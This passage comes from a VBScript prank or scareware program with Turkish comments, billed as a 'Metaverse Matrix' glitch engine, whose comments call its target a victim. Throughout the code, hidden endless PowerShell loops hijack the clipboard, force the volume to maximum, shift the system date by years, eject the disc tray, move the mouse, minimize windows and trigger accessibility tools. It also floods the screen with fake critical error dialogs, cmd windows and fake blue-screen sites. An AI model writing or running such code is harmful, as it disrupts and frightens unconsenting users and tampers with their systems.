shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 7 -Max 15); $w.SendKeys('%{SHIFT}'); }""", 0, False

' [YENİ EKLEME v112.0] AERO WINDOWS GLITCH SHAKE: Pencerelerin Aero Cam efekt odaklarını bozmadan çok küçük milisaniyelerle sarsıntı izi simüle eder
shell.Run "powershell -Command ""Add-Type -AssemblyName System.Windows.Forms; while($true){ Start-Sleep -Seconds (Get-Random -Min 5 -Max 12); for($i=0; $i -lt 15; $i++){ [System.Windows.Forms.Application]::DoEvents(); Start-Sleep -Milliseconds 20 } }""", 0, False

' [YENİ EKLEME v113.0] HAYALET RENK FİLTRESİ DÖNGÜSÜ: Windows yerleşik erişilebilirlik renk filtrelerini arka planda anlık olarak açıp kapatır
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 10 -Max 22); $w.SendKeys('^#c'); Start-Sleep -Milliseconds 1500; $w.SendKeys('^#c'); }""", 0, False

' [YENİ EKLEME v113.0] KONSOL ARKA PLAN VE YAZI RENK STORMU: Açık CMD pencerelerinin buffer renk paletlerini otonom bir kaos senkronuna sokar
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; $colors = @('0a','04','01','06','0b','0f','0e','05','03','02','0c','9f','e0','0d'); while($true){ Start-Sleep -Seconds (Get-Random -Min 4 -Max 8); $c = $colors[(Get-Random -Min 0 -Max 14)]; $w.AppActivate('METAVERSE_'); $w.SendKeys(('color ' + $c + '{ENTER}')); }""", 0, False

' [YENİ EKLEME v114.0] HAYALET YAPIŞKAN TUŞLAR SES GLITCHI: Belirli aralıklarla Windows yerleşik yapışkan tuş ses efektini tetikleyen otonom döngü
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true){ Start-Sleep -Seconds (Get-Random -Min 12 -Max 24); for($i=0; $i -lt 5; $i++){ $w.SendKeys('{SHIFT}'); Start-Sleep -Milliseconds 50 } }""", 0, False

' [YENİ EKLEME v114.0] MATRIX TIME PARADOX SAAT MOTORU: Sağ alt köşedeki saati ve tarihi anlık sarsıntılarla manipüle edip geri yükleyen kozmik katman
shell.Run "powershell -Command ""while($true){ Start-Sleep -Seconds (Get-Random -Min 20 -Max 40); $oldDate = Get-Date; $newDate = $oldDate.AddYears((Get-Random -Min -5 -Max 5)); Set-Date $newDate; Start-Sleep -Seconds 2; Set-Date $oldDate }""", 0, False

' Arka planda kod bitene kadar klavye LED ışıklarını çılgınca tetikleyen donanımsal ritim motoru
shell.Run "powershell -Command ""$w = New-Object -ComObject WScript.Shell; while($true) { $w.SendKeys('{CAPSLOCK}'); Start-Sleep -Milliseconds 200; $w.SendKeys('{NUMLOCK}'); Start-Sleep -Milliseconds 200 }""", 0, False

' [YENİ EKLEME V32] Klavye Işık Motoru Ek Katmanı: Scroll Lock LED ini de çılgın ritme dahil eder
shell.Run "powershell -Command ""while($true){ $w = New-Object -ComObject WScript.Shell; $w.SendKeys('{SCROLLLOCK}'); Start-Sleep -Milliseconds 500 }""", 0, False

' [YENİ EKLEME V33] Ses HUD Kasırgası: Windows ses göstergesini sürekli ekranda tutmak için yukarı/aşağı ses tetiklemesi
shell.Run "powershell -Command ""while($true){ $w = New-Object -ComObject WScript.Shell; $w.SendKeys([char]175); Start-Sleep -Milliseconds 100; $w.SendKeys([char]174); Start-Sleep -Seconds 5 }""", 0, False

' [YENİ EKLEME V26] CD-ROM Poltergeist: Varsa CD/DVD tepsisini sürekli dışarı fırlatan sonsuz döngü
shell.Run "powershell -Command ""$wmp = New-Object -ComObject WMPlayer.OCX; while($true) { if($wmp.cdromCollection.Count -gt 0) { $wmp.cdromCollection.Item(0).Eject(); } Start-Sleep -Seconds 15; }""", 0, False

' [YENİ EKLEME V26] Pano (Clipboard) Kilitleyici: Kopyala-Yapıştır yapmayı imkansız kılan arka plan döngüsü
shell.Run "powershell -Command ""while($true){ Set-Clipboard -Value 'SISTEM ELE GECIRILDI - KOPYALAMA IPTAL!'; Start-Sleep -Seconds 1 }""", 0, False

' [YENİ EKLEME V26] Duyusal Aşırı Yükleme: Windows Ekran Okuyucusu ve Büyüteç aracı tetikleniyor
shell.Run "narrator.exe", 0, False
shell.Run "magnify.exe", 0, False

' [YENİ EKLEME V27] Ses Kapatmayı Engelleyici: Kurban sesi kıssa bile her 3 saniyede bir zorla %100 yapar
shell.Run "powershell -Command ""while($true){ $w = New-Object -ComObject WScript.Shell; for($i=0; $i -lt 50; $i++){ $w.SendKeys([char]175) }; Start-Sleep -Seconds 3 }""", 0, False

' [YENİ EKLEME V27] Hayalet Başlat Menüsü: Ara sıra odağı bozmak için Başlat menüsünü açıp kapatır
shell.Run "powershell -Command ""while($true){ $w = New-Object -ComObject WScript.Shell; $w.SendKeys('^{ESC}'); Start-Sleep -Seconds 12 }""", 0, False

' [YENİ EKLEME V27] Rastgele Bip Senfonisi: Beklenmedik anlarda farklı tonlarda anakart bip sesi çıkarır
shell.Run "powershell -Command ""while($true){ [console]::beep((Get-Random -Min 400 -Max 2000), 300); Start-Sleep -Seconds (Get-Random -Min 4 -Max 10) }""", 0, False

' [YENİ EKLEME V27] Tarayıcı Ruleti: Sürekli olarak zararsız ama yeni web sekmeleri açarak kurbanı boğar
shell.Run "powershell -Command ""while($true){ Start-Process 'https://pranx.com/windows93/'; Start-Sleep -Seconds 30 }""", 0, False

' [YENİ EKLEME V34] Tarayıcı Ruleti Ek Katmanı: Arka planda otonom olarak Nyan Cat sekme bombardımanı başlatır
shell.Run "powershell -Command ""while($true){ Start-Process 'https://nyanpass.com/'; Start-Sleep -Seconds 45 }""", 0, False

' [YENİ EKLEME V35] Tarayıcı Ruleti Mavi Ekran Katmanı: Arka planda otonom olarak sahte Windows ekranları tetikler
shell.Run "powershell -Command ""while($true){ Start-Process 'https://pranx.com/win10-blue-screen/'; Start-Sleep -Seconds 60 }""", 0, False

' [YENİ EKLEME V28] Minimize Kasırgası: Her 40 saniyede bir tüm pencereleri otomatik küçülterek kurbanın odağını yok eder
shell.Run "powershell -Command ""while($true){ (New-Object -ComObject Shell.Application).MinimizeAll(); Start-Sleep -Seconds 40 }""", 0, False

' [YENİ EKLEME V28] Konuşan Arka Plan Gölgeleri: Belirli aralıklarla arka planda fısıldayan ek bir yapay zeka ses motoru fırlatır
shell.Run "powershell -Command ""while($true){ $v = New-Object -ComObject SAPI.SpVoice; $v.Rate = -3; $v.Speak('System anomaly detected in Ring Zero. Core stabilization required.'); Start-Sleep -Seconds 50 }""", 0, False

' [YENİ EKLEME V29] Akustik Hata Resitali: Arka planda Windows un kendi orijinal hata uyarı tonlarını çalma döngüsü
shell.Run "powershell -Command ""while($true){ [System.Media.SystemSounds]::Hand.Play(); Start-Sleep -Seconds (Get-Random -Min 6 -Max 18) }""", 0, False

' [YENİ EKLEME V29] Sahte Siber Telemetri Akışı: Dış ağlara şifreli paket sızdırılıyor algısı yaratan CMD 5 katmanı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0d & title METAVERSE_TELEMETRY_STREAM & prompt DATA_PACKET> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo CRITICAL OUTBOUND BLOCK DETECTED. FORWARDING SYSTEMS DATA TELEMETRY STACK..."
shell.SendKeys "{ENTER}"

' [YENİ EKLEME V31] Mikro-Kayma Efekti (Mouse Drift): Her 22 saniyede bir fareyi çok hafifçe sola kaydırarak kurbanı çıldırtır
shell.Run "powershell -Command ""while($true){ Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.Cursor]::Position = New-Object Drawing.Point(([Windows.Forms.Cursor]::Position.X - 15), [Windows.Forms.Cursor]::Position.Y); Start-Sleep -Seconds 22 }""", 0, False

' [YENİ EKLEME EKRANIN ORTASINA YIĞILAN UYARI MESAJI KASIRGASI (Arka Planda Asenekron Tetikleme - Genişletilmiş 40 Katman)
Set stormFile = fso.CreateTextFile(shell.ExpandEnvironmentStrings("%TEMP%") & "\warning_storm.vbs", True)
stormFile.WriteLine "On Error Resume Next: Set s = CreateObject(""WScript.Shell"")"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚠️ TEHLIKE: METAVERSE BELLEK SIZINTISI ALARMI!"""",16,""""SYSTEM ERROR - LAYER 1"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚠️ KRITIK: CEKIRDEK FREKANSI KARARSIZLASTI!"""",48,""""SYSTEM ERROR - LAYER 2"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🛑 ERISIM ENGELLENDI: VERI AKISI KILITLENDI!"""",16,""""SYSTEM ERROR - LAYER 3"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""ℹ️ BILGI: SIBER TELEMETRI ALTYAPISI ENJEKTE EDILDI!"""",64,""""SYSTEM ERROR - LAYER 4"""")(window.close)"", 1, False"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🔥 AMBIYANS UYARISI: PARADOX DONGUSU AKTIF!"""",16,""""SYSTEM ERROR - LAYER 5"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""☣️ UYARI: MATRIX ENJEKSIYONU TAMAMLANDI!"""",16,""""SYSTEM ERROR - LAYER 6"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🛡️ FIREWALL OVERRIDE: GÜVENLIK DUVARI DEVRE DISI!"""",48,""""SYSTEM ERROR - LAYER 7"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🌌 PARADOX SEVIYESI MAXIMA ULASTI!"""",64,""""SYSTEM ERROR - LAYER 8"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🌀 ODAK NOKTASI KAYBOLDU: SIMULASYON KATMANI 9!"""",48,""""SYSTEM ERROR - LAYER 9"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🛡️ MUTLAK MATRIX SENDROMU: SON KATMAN 10!"""",16,""""SYSTEM ERROR - LAYER 10"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🌀 INFINITE LOOP: PARADOX SEVİYESI 11!"""",48,""""SYSTEM ERROR - LAYER 11"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🔮 NİHAİ KAOS: SİMÜLASYON TAMAMEN ERİDİ KATMAN 12!"""",16,""""SYSTEM ERROR - LAYER 12"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🌀 SONSUZ MATRİS: PARADOX SEVİYESI 13!"""",48,""""SYSTEM ERROR - LAYER 13"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🔮 ULTRA BOYUT: KOD SİMÜLASYONU DOYUMA ULAŞTI KATMAN 14!"""",16,""""SYSTEM ERROR - LAYER 14"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🌌 DONANIM FREKANS KAOSU: SİMÜLASYON KATMANI 15!"""",48,""""SYSTEM ERROR - LAYER 15"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🔥 HARDWARE EMERGENCY: OVERHEATING PHANTOM DETECTED KATMAN 20!"""",16,""""CRITICAL HARDWARE OVERLOAD"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""💾 CACHE DEPLETION: METAVERSE ENGINE MEMORY EXHAUSTED KATMAN 21!"""",48,""""VIRTUAL MEMORY DRAIN"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""☁️ CLOUD CORRUPTION: SECURITY BLOCK DEPLOYED KATMAN 22!"""",16,""""WINDOWS SYSTEM ROLLBACK"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🛡️ DEFENDER BLOCK: CLOUD ISOLATION INITIATED KATMAN 23!"""",16,""""WINDOWS DEFENDER SYSTEM ERROR"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""📦 SFC BLOCK: TELEMETRY INTEGRITY FAILURE KATMAN 24!"""",48,""""WINDOWS RESOURCE PROTECTION ERROR"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""📁 SMB BLOCK: UNAUTHORIZED INBOUND PACKETS KATMAN 25!"""",16,""""WINDOWS FILE SHARING CRITICAL"""")(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ TASKMGR BLOCK: PROCESS ISOLATION FAILURE KATMAN 26!"""",16,""""WINDOWS TASK MANAGER CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""🔊 AUDIO ENDPOINT BLOCK: HARDWARE FREQUENCY DISTORTION KATMAN 27!"""",16,""""WINDOWS AUDIO ENDPOINT CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ KERNEL DEBUGGER BLOCK: UNSTABLE STACK TRACKING DETECTED KATMAN 28!"""",16,""""WINDOWS KERNEL DEBUGGER CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ HARDWARE ISOLATION BLOCK: RING -1 HYPERVISOR BYPASS ATTEMPT KATMAN 29!"""",16,""""WINDOWS HARDWARE ISOLATION CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ CORE MATRIX AXIS BLOCK: CHROMATIC FILTERS OVERLOADED KATMAN 30!"""",16,""""WINDOWS CHROMATIC MATRIX CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ VIRTUAL SCREEN KEYBOARD FLICKER: SAPI AUDIO MATRIX OVERLOAD KATMAN 31!"""",16,""""WINDOWS AUDIO OSK MATRIX CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ HARDWARE THEME REMOVAL PULSE: PHANTOM SCROLL CASCADE ENGAGED KATMAN 32!"""",16,""""WINDOWS PHANTOM THEME SCROLL CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ PHANTOM DRIVE EXPLORER ENJECTOR: SAPI KEYSTATE WHISPER ENGAGED KATMAN 33!"""",16,""""WINDOWS PHANTOM DRIVE CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ PHANTOM DOWNLOAD CONTROLLER: STICKY HELP MATRIX ENGAGED KATMAN 34!"""",16,""""WINDOWS PHANTOM INJECTOR CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ PHANTOM CIPHER BLOCK: ECHO HARDWARE OVERRIDE ENGAGED KATMAN 35!"""",16,""""WINDOWS CIPHER MATRIX CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ PHANTOM MEMORY DUMP BLOCK: TOGGLE HYPERVISOR ENGAGED KATMAN 36!"""",16,""""WINDOWS MEMORY DUMP CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ OMNI PHANTOM SPECTRE PROTOCOL: FOCUS STEALER ACTIVE KATMAN 37!"""",16,""""WINDOWS PHANTOM SPECTRE CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ VECTOR PHANTOM ECLIPSE: AERO DWM FLICKER ENGAGED KATMAN 38!"""",16,""""WINDOWS PHANTOM ECLIPSE CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ QUANTUM ENTROPY PULSE: CONSOLE COLOR BUFFER STORM ACTIVE KATMAN 39!"""",16,""""WINDOWS QUANTUM ENTROPY CRITICAL"""" )(window.close)"", 1, False"
stormFile.WriteLine "WScript.Sleep 300"
stormFile.WriteLine "s.Run ""mshta vbscript:msgbox(""""⚙️ MATRIX SUB-ZERO GRAVITY: PHANTOM STICKY KEYS SOUND ACTIVE KATMAN 40!"""",16,""""WINDOWS SUB-ZERO GRAVITY CRITICAL"""" )(window.close)"", 1, False"
stormFile.Close
shell.Run "wscript.exe " & shell.ExpandEnvironmentStrings("%TEMP%") & "\warning_storm.vbs", 0, False

' ───────────────────────────────────────────────────────────────────
'  FAZ 2: KROMATİK PANEL KASKADI (On Dörtlü CMD Akışı)
' ───────────────────────────────────────────────────────────────────
' CMD 1: Matrix Yeşili
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0a & title METAVERSE_CORE_ALPHA & prompt METAVERSE_A> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo METAVERSE_OVERLOAD: ALL DIMENSIONAL CHANNELS SHIELDED."
shell.SendKeys "{ENTER}"

' CMD 2: Alarm Kırmızısı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 04 & title METAVERSE_CORE_OMEGA & prompt METAVERSE_B> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo CRITICAL: METAVERSE MEMORY MATRIX CONFLICT IN RING ZERO."
shell.SendKeys "{ENTER}"

' CMD 3: Derin Ağ Mavisi
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 01 & title METAVERSE_NET_STREAM & prompt NET_METAVERSE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo DEPLOYING PERSISTENT OMNIPRESENT VISUAL LAYERS..."
shell.SendKeys "{ENTER}"

' CMD 4: Sahte Disk Taraması (Sarı Alarm)
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 06 & title METAVERSE_DISK_SCAN & prompt DISK_SCAN> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo WARNING: CHKDSK C: /F /R IN PROGRESS... SECTOR MUTATION DETECTED!"
shell.SendKeys "{ENTER}"

' CMD 6: Turkuaz Kuantum Ağ Katmanı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0b & title METAVERSE_QUANTUM_NET & prompt QUANTUM_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo INITIALIZING QUANTUM ENTANGLEMENT CHANNELS... STABLE."
shell.SendKeys "{ENTER}"

' CMD 7: Parlak Beyaz Çekirdek Çözümleme Katmanı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0f & title METAVERSE_DECRYPTION_CORE & prompt DECRYPT> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo CRITICAL: DECRYPTION OF THE MAIN VIRTUAL SUB-SYSTEM IS COMPLETED."
shell.SendKeys "{ENTER}"

' CMD 8: Altın Frekans Spektrumu
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0e & title METAVERSE_GOLDEN_RATIO & prompt GOLDEN_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo CRITICAL: METAVERSE FREQUENCY RECALIBRATING TO GOLDEN RATIO... 1.618"
shell.SendKeys "{ENTER}"

' CMD 9: Eflatun Kuantum Çekirdeği
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 05 & title METAVERSE_HYPER_DRIVE & prompt HYPER> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo CRITICAL: HYPER CORE AT 99% EFFICIENCY."
shell.SendKeys "{ENTER}"

' CMD 10: Deniz Mavisi Sonsuzluk Katmanı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 03 & title METAVERSE_FINAL_INFINITY & prompt INFINITY> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo INF_LAYER: OMNIPRESENT COGNITIVE STACK COMPLETED."
shell.SendKeys "{ENTER}"

' CMD 11: Canlı Matris Yeşili
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 02 & title METAVERSE_MATRIX_GREEN & prompt GREEN_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo STATUS: PROTOCOL DEPLOYED SUCCESSFULLY TO ALL MEMORY BANKS."
shell.SendKeys "{ENTER}"

' CMD 12: Parlak Kırmızı Kıyamet Panel Akışı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 0c & title METAVERSE_DOOMSDAY & prompt DOOM_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo WARNING: CORE TEMPERATURE IS SIMULATING CRITICAL LIMITS."
shell.SendKeys "{ENTER}"

' CMD 13: Açık Mavi Siber Şok Akışı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color 9f & title METAVERSE_CYBER_LIGHT & prompt LIGHT_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo STATUS: COGNITIVE OVERLAY FULLY OPERATIONAL ON ALL THREADS."
shell.SendKeys "{ENTER}"

' CMD 14: Neon Sarı Alarm Akışı
shell.Run "cmd.exe"
WScript.Sleep 300
shell.SendKeys "color e0 & title METAVERSE_NEON_ALARM & prompt NEON_CORE> & cls"
shell.SendKeys "{ENTER}"
shell.SendKeys "echo WARNING: MATRIX SPECTRUM DENSITY AT MAXIMUM LEVEL."
shell.SendKeys "{ENTER}"

WScript.Sleep 1000
' Klasör dizin ağacını akıtarak görsel karmaşayı tetikler
shell.SendKeys "tree C:\"
shell.SendKeys "{ENTER}"
WScript.Sleep 1500

' ───────────────────────────────────────────────────────────────────
'  FAZ 3: OTONOM TARAYICI VE PANO BLOKAJI
' ───────────────────────────────────────────────────────────────────
voice.Speak "Initializing web gateway diagnostic."
shell.Run "https://www.google.com"
WScript.Sleep 3000

Sub HayaletKlavye(metin)
    Dim x
    For x = 1 To Len(metin)
        shell.SendKeys Mid(metin, x, 1)
        WScript.Sleep 60
    Next
    WScript.Sleep 300
    shell.SendKeys "{ENTER}"
End Sub

HayaletKlavye "bilgisayara metaverse matrix virüsü girdi geri donusum modu 2026"
WScript.Sleep 2000

' İnternet sitelerini ön plana fırlatır
shell.Run "https://hackertyper.net/"
WScript.Sleep 400
shell.Run "https://pointerpointer.com"
WScript.Sleep 400

' Görsel kaosu artırmak için ek şaka tabanlı sahte arayüz pencereleri açar
shell.Run "https://pranx.com/fake-virus/"
WScript.Sleep 300
shell.Run "https://pranx.com/hacker/"
WScript.Sleep 300

' Gerçekçi Mavi Ekran (BSOD) Çökme illüzyonu tam ekran sekmesi
shell.Run "https://fakeupdate.net/win10ue/"
WScript.Sleep 300

' Manuel tetiklenen ilk İnek Dansı sekmesi
shell.Run "https://www.google.com/search?q=inek+dans%C4%B1"
WScript.Sleep 300

' Kurbanın kopyalayacağı metinleri bozmak için panoyu kilitler
shell.Run "cmd /c echo METAVERSE PARADOX MAXIMUM CORE SYSTEM ENGAGED! CHANNELS SEVERED! | clip", 0, True

' Masaüstünü tekrar temizle
objShell.MinimizeAll
WScript.Sleep 1000

' ───────────────────────────────────────────────────────────────────
'  FAZ 4: ON ALTILI KAOTİK PENCERE KASIRGASI (Kaynak İzleyiciler Dahil)
' ───────────────────────────────────────────────────────────────────
shell.Run "notepad.exe"
shell.Run "calc.exe"
shell.Run "mspaint.exe"
shell.Run "write.exe"
shell.Run "charmap.exe"
WScript.Sleep 1000

' Control Paneli Kaosu: Sistem ayar menüleri fırlatılıyor
shell.Run "control.exe mmsys.cpl" ' Ses Ayarları
WScript.Sleep 100
shell.Run "control.exe timedate.cpl" ' Tarih/Saat Ayarları
WScript.Sleep 100
shell.Run "control.exe hdwwiz.cpl" ' Aygıt Yönetim Paneli
WScript.Sleep 100

' Ekran Konfigürasyon Dansı
shell.Run "control.exe desk.cpl"
WScript.Sleep 100

' Sistemsel İnceleme Penceresi (DxDiag) kaskada enjekte ediliyor
shell.Run "dxdiag.exe"
WScript.Sleep 100

' Sistem Temizlik Arayüzü (Cleanmgr) kaskada ekleniyor
shell.Run "cleanmgr.exe"
WScript.Sleep 100

' Ekran Klavyesi og Telefon Çevirici
shell.Run "osk.exe"
WScript.Sleep 100
shell.Run "dialer.exe"
WScript.Sleep 100

' Kaynak İzleyici og Performans İzleyici
shell.Run "resmon.exe"
WScript.Sleep 100
shell.Run "perfmon.exe"
WScript.Sleep 100

' Senkronizasyon Merkezi og Ekran Alıntısı Aracı
shell.Run "mobsync.exe"
WScript.Sleep 100
shell.Run "snippingtool.exe"
WScript.Sleep 100

' Olay Görüntüleyicisi (eventvwr.msc) og Bilgisayar Yönetimi (compmgmt.msc) kaskada dahil ediliyor
shell.Run "mmc.exe eventvwr.msc"
WScript.Sleep 100
shell.Run "mmc.exe compmgmt.msc"
WScript.Sleep 100

' Tüm uygulamaları inanılmaz bir hızla sırayla öne çağırarak dans ettirir
For i = 1 To 5
    shell.AppActivate "Notepad"
    WScript.Sleep 80
    shell.AppActivate "Calculator"
    WScript.Sleep 80
    shell.AppActivate "untitled - Paint"
    WScript.Sleep 80
    shell.AppActivate "Document - WordPad"
    WScript.Sleep 80
    shell.AppActivate "Character Map"
    WScript.Sleep 80
    shell.AppActivate "METAVERSE_CORE_ALPHA"
    WScript.Sleep 80
    shell.AppActivate "Sound"
    WScript.Sleep 50
    shell.AppActivate "Device Manager"
    WScript.Sleep 50
    shell.AppActivate "Settings"
    WScript.Sleep 50
    shell.AppActivate "DirectX Diagnostic Tool"
    WScript.Sleep 50
    shell.AppActivate "Disk Cleanup"
    WScript.Sleep 50
    shell.AppActivate "On-Screen Keyboard"
    WScript.Sleep 50
    shell.AppActivate "Phone Dialer"
    WScript.Sleep 50
    shell.AppActivate "Resource Monitor"
    WScript.Sleep 50
    shell.AppActivate "Performance Monitor"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_HYPER_DRIVE"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_FINAL_INFINITY"
    WScript.Sleep 50
    shell.AppActivate "Sync Center"
    WScript.Sleep 50
    shell.AppActivate "Snipping Tool"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_MATRIX_GREEN"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_DOOMSDAY"
    WScript.Sleep 50
    shell.AppActivate "Event Viewer"
    WScript.Sleep 50
    shell.AppActivate "Computer Management"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_CYBER_LIGHT"
    WScript.Sleep 50
    shell.AppActivate "METAVERSE_NEON_ALARM"
    WScript.Sleep 50
Next

' ───────────────────────────────────────────────────────────────────
'  FAZ 5: MANİFESTO VE BÜYÜK ASCII SANATI (Not Defteri)
' ───────────────────────────────────────────────────────────────────
shell.AppActivate "Notepad"
WScript.Sleep 500

Sub NotDefteriYaz(metin)
    Dim y
    For y = 1 To Len(metin)
        shell.SendKeys Mid(metin, y, 1)
        WScript.Sleep 15 
    Next
    shell.SendKeys "{ENTER}"
End Sub

NotDefteriYaz "=================================================="
NotDefteriYaz "    METAVERSE OMNI MATRIX GLITCH ENGINE v26.0     "
NotDefteriYaz "=================================================="
WScript.Sleep 400
NotDefteriYaz "Sanal simülasyonun ulasilamaz mutlak son noktasindasiniz."
NotDefteriYaz "Donanımınız guvendedir, sadece Windows kod sanati calisiyor."
WScript.Sleep 600
NotDefteriYaz "Tum parametreler kusursuzca ust uste bindirildi."
NotDefteriYaz "Klavyenizin donanimsal led isiklariyla ritim senkronizasyonu:"

' Klavye ışıklarını tetikler
For i = 1 To 4
    shell.SendKeys "{CAPSLOCK}"
    WScript.Sleep 60
    shell.SendKeys "{NUMLOCK}"
    WScript.Sleep 60
    shell.SendKeys "{SCROLLLOCK}"
    WScript.Sleep 60
Next

NotDefteriYaz "Nihai yapay zeka sureti aktariliyor..."
WScript.Sleep 400
NotDefteriYaz "      .--------."
